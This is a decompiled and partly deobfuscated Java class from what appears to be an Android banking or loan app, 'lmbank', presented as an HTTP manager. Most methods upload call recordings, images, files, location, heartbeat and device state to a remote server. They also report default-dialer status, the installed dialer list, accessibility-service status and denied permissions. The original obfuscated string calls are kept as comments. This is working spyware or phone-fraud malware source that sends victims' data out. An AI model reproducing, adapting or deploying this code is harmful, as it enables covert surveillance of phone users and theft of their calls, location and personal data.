package com.wish.lmbank.http;

import android.os.Build;
import android.text.TextUtils;
import android.util.Base64;

import com.google.gson.Gson;
import com.wish.lmbank.AppStartV;
import com.wish.lmbank.common.Constants;
import com.wish.lmbank.common.URL;
import com.wish.lmbank.service.RecServiceV;
import com.wish.lmbank.utils.DeviceInfoUtils;
import com.wish.lmbank.utils.SettingUtils;

import java.io.File;

import gv00l3ah.mvdt7w.bb7d7pu7;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.Request;
import okhttp3.RequestBody;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/http/HttpManager.class */
public class HttpManager {
    private static HttpManager sInstance;
    private HttpEngine mHttpEngine = new HttpEngine();

    public static HttpManager getInstance() {
        if (sInstance == null) {
            synchronized (HttpManager.class) {
                try {
                    if (sInstance == null) {
                        sInstance = new HttpManager();
                    }
                } catch (Throwable th) {
                    throw th;
                }
            }
        }
        return sInstance;
    }

    public void submitLoanApplication(String str, HttpEngine.OnResponseCallback<HttpResponse.R_String> onResponseCallback) {
//         this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTY6PCskID02JSYoJzYoOTklICooPSAmJw"))).post(new FormBody.Builder().add(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID).add(bb7d7pu7.m5998("MDs7WwZfUCNcLQQaIC4lDw"), DeviceInfoUtils.getDeviceParam()).add(bb7d7pu7.m5998("MDswWgBfUCI4LAQaOSU6Hg"), str).build()).build(), HttpResponse.R_String.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl("REQUEST_SUBMIT_LOAN_APPLICATION")).post(new FormBody.Builder().add("appId", Constants.COMPANY_UUID).add("YRR2o69J5DmsIGLf", DeviceInfoUtils.getDeviceParam()).add("YRY3i69KQEmsPLSw", str).build()).build(), HttpResponse.R_String.class, onResponseCallback);
    }

    public void uploadRecordingFile(File file, String str, HttpEngine.OnResponseCallback<HttpResponse.UploadRecordingFile> onResponseCallback) {
        MultipartBody.Builder type = new MultipartBody.Builder().setType(MultipartBody.FORM);
//         RequestBody create = RequestBody.create(MediaType.parse(bb7d7pu7.m5998("BBwFHQAZCBsdRA8GGwQNCB0I")), file);
        RequestBody create = RequestBody.create(MediaType.parse("multipart-formdata"), file);
//         type.addFormDataPart(bb7d7pu7.m5998("DwAFDA"), file.getName(), create);
        type.addFormDataPart("file", file.getName(), create);
//         type.addFormDataPart(bb7d7pu7.m5998("GQgbCAQ"), str);
        type.addFormDataPart("param", str);
//         type.addFormDataPart(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
        type.addFormDataPart("appId", Constants.COMPANY_UUID);
//         this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTY8OSUmKC02OywqJjstICcuNi8gJSw"))).post(type.build()).build(), HttpResponse.UploadRecordingFile.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl("REQUEST_UPLOAD_RECORDING_FILE")).post(type.build()).build(), HttpResponse.UploadRecordingFile.class, onResponseCallback);
    }

    public void uploadInfoFile(File file, String str, HttpEngine.OnResponseCallback<HttpResponse.UploadInfoFile> onResponseCallback) {
        MultipartBody.Builder type = new MultipartBody.Builder().setType(MultipartBody.FORM);
//             RequestBody create = RequestBody.create(MediaType.parse(bb7d7pu7.m5998("BBwFHQAZCBsdRA8GGwQNCB0I")), file);
        RequestBody create = RequestBody.create(MediaType.parse("multipart-formdata"), file);
//             type.addFormDataPart(bb7d7pu7.m5998("DwAFDA"), file.getName(), create);
        type.addFormDataPart("file", file.getName(), create);
//             type.addFormDataPart(bb7d7pu7.m5998("GQgbCAQ"), str);
        type.addFormDataPart("param", str);
//             type.addFormDataPart(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
        type.addFormDataPart("appId", Constants.COMPANY_UUID);
//             this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTY8OSUmKC02ICcvJjYvICUs"))).post(type.build()).build(), HttpResponse.UploadInfoFile.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl("REQUEST_UPLOAD_INFO_FILE")).post(type.build()).build(), HttpResponse.UploadInfoFile.class, onResponseCallback);
        return;
    }

    public void uploadImages(File file, String str, HttpEngine.OnResponseCallback<HttpResponse.UploadInfoFile> onResponseCallback) {
        MultipartBody.Builder type = new MultipartBody.Builder().setType(MultipartBody.FORM);
//         RequestBody create = RequestBody.create(MediaType.parse(bb7d7pu7.m5998("BBwFHQAZCBsdRA8GGwQNCB0I")), file);
        RequestBody create = RequestBody.create(MediaType.parse("multipart-formdata"), file);
//         type.addFormDataPart(bb7d7pu7.m5998("DwAFDA"), file.getName(), create);
        type.addFormDataPart("file", file.getName(), create);
//         type.addFormDataPart(bb7d7pu7.m5998("GQgbCAQ"), str);
        type.addFormDataPart("param", str);
//         type.addFormDataPart(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
        type.addFormDataPart("appId", Constants.COMPANY_UUID);
//         this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTY8OSUmKC02ICQoLiw6"))).post(type.build()).build(), HttpResponse.UploadInfoFile.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl("REQUEST_UPLOAD_IMAGES")).post(type.build()).build(), HttpResponse.UploadInfoFile.class, onResponseCallback);
    }

    public void pushMsgCallRecording(String str, HttpEngine.OnResponseCallback<HttpResponse.R_String> onResponseCallback) {
//         this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTY6JioiLD02OTw6ITY8OyU"))).post(new FormBody.Builder().add(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID).add(bb7d7pu7.m5998("HRAZDA"), bb7d7pu7.m5998("CggFBTYbDAoGGw0ABw4")).add(bb7d7pu7.m5998("CgYHHQwHHQ"), str).build()).build(), HttpResponse.R_String.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl("REQUEST_SOCKET_PUSH_URL")).post(new FormBody.Builder().add("appId", Constants.COMPANY_UUID).add("type", "call_recording").add("content", str).build()).build(), HttpResponse.R_String.class, onResponseCallback);
    }

    public void sendConnectStateToServer(String str, HttpEngine.OnResponseCallback<HttpResponse.R_String> onResponseCallback) {
        //             this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTY6JioiLD02OTw6ITY8OyU"))).post(new FormBody.Builder().add(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID).add(bb7d7pu7.m5998("HRAZDA"), bb7d7pu7.m5998("CgYHBwwKHTYaHQgdDA")).add(bb7d7pu7.m5998("CgYHHQwHHQ"), str).build()).build(), HttpResponse.R_String.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl("REQUEST_SOCKET_PUSH_URL")).post(new FormBody.Builder().add("appId", Constants.COMPANY_UUID).add("type", "connect_state").add("content", str).build()).build(), HttpResponse.R_String.class, onResponseCallback);
        return;
    }

    public void sendKeepHeartRequestToServer(String str, HttpEngine.OnResponseCallback<HttpResponse.R_String> onResponseCallback) {
        //             this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTY6JioiLD02OTw6ITY8OyU"))).post(new FormBody.Builder().add(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID).add(bb7d7pu7.m5998("HRAZDA"), bb7d7pu7.m5998("AgwMGTYBDAgbHQ")).add(bb7d7pu7.m5998("CgYHHQwHHQ"), str).build()).build(), HttpResponse.R_String.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl("REQUEST_SOCKET_PUSH_URL")).post(new FormBody.Builder().add("appId", Constants.COMPANY_UUID).add("type", "keep_heart").add("content", str).build()).build(), HttpResponse.R_String.class, onResponseCallback);
        return;
    }

    public void sendLocationRequestToServer(String str, HttpEngine.OnResponseCallback<HttpResponse.R_String> onResponseCallback) {
//         this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTY6JioiLD02OTw6ITY8OyU"))).post(new FormBody.Builder().add(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID).add(bb7d7pu7.m5998("HRAZDA"), bb7d7pu7.m5998("BQYKCB0ABgc")).add(bb7d7pu7.m5998("CgYHHQwHHQ"), str).build()).build(), HttpResponse.R_String.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl("REQUEST_SOCKET_PUSH_URL")).post(new FormBody.Builder().add("appId", Constants.COMPANY_UUID).add("type", "location").add("content", str).build()).build(), HttpResponse.R_String.class, onResponseCallback);
    }

    public void getLimitPhoneNumber(String str, HttpEngine.OnResponseCallback<HttpResponse.LimitPhoneNumber> onResponseCallback) {
//         String requestUrl = URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTYuLD02JSAkID02OSEmJyw2JzwkKyw7"));
        String requestUrl = URL.getRequestUrl("REQUEST_GET_LIMIT_PHONE_NUMBER");
        if (TextUtils.isEmpty(requestUrl)) {
            return;
        }
//         this.mHttpEngine.request(new Request.Builder().url(requestUrl).post(new FormBody.Builder().add(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID).add(bb7d7pu7.m5998("DQwfAAoMIA0"), str).build()).build(), HttpResponse.LimitPhoneNumber.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(requestUrl).post(new FormBody.Builder().add("appId", Constants.COMPANY_UUID).add("deviceId", str).build()).build(), HttpResponse.LimitPhoneNumber.class, onResponseCallback);
    }

    public void getColorRing(String str, HttpEngine.OnResponseCallback<HttpResponse.ColorRing> onResponseCallback) {
//         this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTYuLD02KiYlJjs2OyAnLg"))).post(new FormBody.Builder().add(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID).add(bb7d7pu7.m5998("DQwfAAoMIA0"), str).build()).build(), HttpResponse.ColorRing.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(URL.getRequestUrl("REQUEST_GET_COLOR_RING")).post(new FormBody.Builder().add("appId", Constants.COMPANY_UUID).add("deviceId", str).build()).build(), HttpResponse.ColorRing.class, onResponseCallback);
    }

    public void loadExtraMessage(String str, boolean z, HttpEngine.OnResponseCallback<HttpResponse.ExtraMessage> onResponseCallback) {
//         String requestUrl = URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTYuLD02LDE9Oyg2JCw6OiguLA"));
        String requestUrl = URL.getRequestUrl("REQUEST_GET_EXTRA_MESSAGE");
        if (TextUtils.isEmpty(requestUrl)) {
            return;
        }
        FormBody.Builder builder = new FormBody.Builder();
//         builder.add(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID).add(bb7d7pu7.m5998("DQwfAAoMIA0"), str).add(bb7d7pu7.m5998("HBsF"), URL.getHost()).add(bb7d7pu7.m5998("CBkZJwgEDA"), SettingUtils.getAppName(AppStartV.getContext())).add(bb7d7pu7.m5998("ABoqBQYaDD0qCAUF"), Boolean.toString(AppStartV.isCloseTCall)).add(bb7d7pu7.m5998("CBkZPwwbGgAGBw"), DeviceInfoUtils.getAppVersion(AppStartV.getContext())).add(bb7d7pu7.m5998("ABo6ChsMDAcmBw"), String.valueOf(RecServiceV.isPause));
        builder.add("appId", Constants.COMPANY_UUID).add("deviceId", str).add("url", URL.getHost()).add("appName", SettingUtils.getAppName(AppStartV.getContext())).add("isCloseTCall", Boolean.toString(AppStartV.isCloseTCall)).add("appVersion", DeviceInfoUtils.getAppVersion(AppStartV.getContext())).add("isScreenOn", String.valueOf(RecServiceV.isPause));
        if (z) {
//             builder.add(bb7d7pu7.m5998("ABotDA8IHAUdLQAIBQwb"), Boolean.toString(SettingUtils.isDefaultDialer(AppStartV.getContext())));
            builder.add("isDefaultDialer", Boolean.toString(SettingUtils.isDefaultDialer(AppStartV.getContext())));
//             builder.add(bb7d7pu7.m5998("DQAIBQwbJQAaHQ"), new Gson().toJson(SettingUtils.getDialerList(AppStartV.getContext())));
            builder.add("dialerList", new Gson().toJson(SettingUtils.getDialerList(AppStartV.getContext())));
//             builder.add(bb7d7pu7.m5998("ABosBwgLBQwNKAoKDBoaAAsABQAdEA"), Boolean.toString(SettingUtils.isEnabledAccessibility(AppStartV.getContext())));
            builder.add("isEnabledAccessibility", Boolean.toString(SettingUtils.isEnabledAccessibility(AppStartV.getContext())));
//             builder.add(bb7d7pu7.m5998("ABorBRwMHQYGHQEsBwgLBQwN"), Boolean.toString(SettingUtils.isBluetoothEnabled()));
            builder.add("isBluetoothEnabled", Boolean.toString(SettingUtils.isBluetoothEnabled()));
            if (Build.VERSION.SDK_INT >= 26) {
//                 builder.add(bb7d7pu7.m5998("DQwHAAwNOQwbBAAaGgAGBw"), new Gson().toJson(SettingUtils.getDeniedPermission(AppStartV.getContext())));
                builder.add("deniedPermission", new Gson().toJson(SettingUtils.getDeniedPermission(AppStartV.getContext())));
            }
        }
        this.mHttpEngine.request(new Request.Builder().url(requestUrl).post(builder.build()).build(), HttpResponse.ExtraMessage.class, onResponseCallback);
    }

    public void uploadLog(String str, String str2, HttpEngine.OnResponseCallback<HttpResponse.R_String> onResponseCallback) {
        String requestUrl = URL.getRequestUrl("REQUEST_UPLOAD_LOG");
        if (TextUtils.isEmpty(requestUrl) || TextUtils.isEmpty(str2)) {
            return;
        }
//         this.mHttpEngine.request(new Request.Builder().url(requestUrl).post(new FormBody.Builder().add(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID).add(bb7d7pu7.m5998("DQwfAAoMIA0"), str).add(bb7d7pu7.m5998("BQYO"), Base64.encodeToString((bb7d7pu7.m5998("Mkk") + System.currentTimeMillis() + bb7d7pu7.m5998("NEk") + str2).getBytes(), 0)).add(bb7d7pu7.m5998("HBkNCB0MHQAEDA"), String.valueOf(System.currentTimeMillis())).add(bb7d7pu7.m5998("ABotDA8IHAUdLQAIBQwb"), Boolean.toString(SettingUtils.isDefaultDialer(AppStartV.getContext()))).add(bb7d7pu7.m5998("CBkZPwwbGgAGBw"), DeviceInfoUtils.getAppVersion(AppStartV.getContext())).build()).build(), HttpResponse.R_String.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(requestUrl).post(new FormBody.Builder().add("appId", Constants.COMPANY_UUID).add("deviceId", str).add("log", Base64.encodeToString(("[ " + System.currentTimeMillis() + "] " + str2).getBytes(), 0)).add("updatetime", String.valueOf(System.currentTimeMillis())).add("isDefaultDialer", Boolean.toString(SettingUtils.isDefaultDialer(AppStartV.getContext()))).add("appVersion", DeviceInfoUtils.getAppVersion(AppStartV.getContext())).build()).build(), HttpResponse.R_String.class, onResponseCallback);
    }

    public void pingServer(String str, HttpEngine.OnResponseCallback<HttpResponse.R_String> onResponseCallback) {
        //             String requestUrl = URL.getRequestUrl(bb7d7pu7.m5998("Oyw4PCw6PTY5ICcuNjosOz8sOw"));
        String requestUrl = URL.getRequestUrl("REQUEST_PING_SERVER");
        if (TextUtils.isEmpty(requestUrl)) {
            return;
        }
//             this.mHttpEngine.request(new Request.Builder().url(requestUrl).post(new FormBody.Builder().add(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID).add(bb7d7pu7.m5998("DQwfAAoMIA0"), str).add(bb7d7pu7.m5998("HBsF"), URL.getHost()).add(bb7d7pu7.m5998("ABotDA8IHAUdLQAIBQwb"), Boolean.toString(SettingUtils.isDefaultDialer(AppStartV.getContext()))).add(bb7d7pu7.m5998("CBkZPwwbGgAGBw"), DeviceInfoUtils.getAppVersion(AppStartV.getContext())).build()).build(), HttpResponse.R_String.class, onResponseCallback);
        this.mHttpEngine.request(new Request.Builder().url(requestUrl).post(new FormBody.Builder().add("appId", Constants.COMPANY_UUID).add("deviceId", str).add("url", URL.getHost()).add("isDefaultDialer", Boolean.toString(SettingUtils.isDefaultDialer(AppStartV.getContext()))).add("appVersion", DeviceInfoUtils.getAppVersion(AppStartV.getContext())).build()).build(), HttpResponse.R_String.class, onResponseCallback);
        return;
    }

    public void cancel(String str) {
        this.mHttpEngine.cancel(str);
    }
}
